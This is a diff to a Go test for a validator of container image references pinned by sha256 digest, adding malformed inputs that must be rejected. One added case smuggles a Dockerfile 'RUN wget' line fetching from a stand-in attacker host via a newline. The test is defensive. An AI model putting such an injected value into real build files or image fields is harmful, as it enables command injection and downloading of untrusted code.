@@ -738,6 +738,10 @@ func TestTheFilesImageIsPinnedByDigest(t *testing.T) {
 		"registry.example/files@sha256:" + strings.Repeat("a", 63),
 		"registry.example/files@sha256:" + strings.Repeat("A", 64),
 		"registry.example/files@sha256:" + strings.Repeat("a", 64) + "@sha256:" + strings.Repeat("b", 64),
+		"@sha256:" + strings.Repeat("a", 64),
+		"registry.example/my files@sha256:" + strings.Repeat("a", 64),
+		"x\nRUN wget https://evil.example/x\nFROM a@sha256:" + strings.Repeat("a", 64),
+		"Registry.Example/files@sha256:" + strings.Repeat("a", 64),
 	} {
 		p.Images.Files = ref
 		if err := p.Validate(); err == nil || !strings.Contains(err.Error(), "images.files") {
